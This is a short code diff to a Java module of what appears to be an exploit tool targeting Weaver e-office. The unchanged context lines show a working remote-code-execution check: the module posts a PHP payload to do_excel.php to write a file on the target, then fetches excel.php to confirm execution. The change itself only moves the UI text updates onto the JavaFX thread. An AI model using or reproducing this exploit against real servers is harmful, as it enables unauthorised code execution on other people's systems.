@@ -2,6 +2,7 @@ package exp.oa.weaveroa;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -22,10 +23,11 @@ public class weaveroa_doExecl implements Exploitlnterface {
         HttpTools.post(url + "/general/charge/charge_list/do_excel.php", "html=<?+phpinfo();?>", new HashMap<>(), "utf-8");
         Response response = HttpTools.get(url + "/general/charge/charge_list/excel.php", new HashMap<String, String>(), "utf-8");
         if(response.getCode() == 200 && response.getText().contains("disable_functions")){
-            textArea.appendText("\n 漏洞存在 phpinfo已写入 \n" + url + "/general/charge/charge_list/excel.php");
+            Platform.runLater(()->{ textArea.appendText("\n 漏洞存在 phpinfo已写入 \n" + url + "/general/charge/charge_list/excel.php");});
+
             return true;
         }else {
-            textArea.appendText("\n e-office doexecl.php-RCE-漏洞不存在 (出现误报请联系作者)");
+            Platform.runLater(()->{ textArea.appendText("\n e-office doexecl.php-RCE-漏洞不存在 (出现误报请联系作者)");});
             return false;
         }
     }
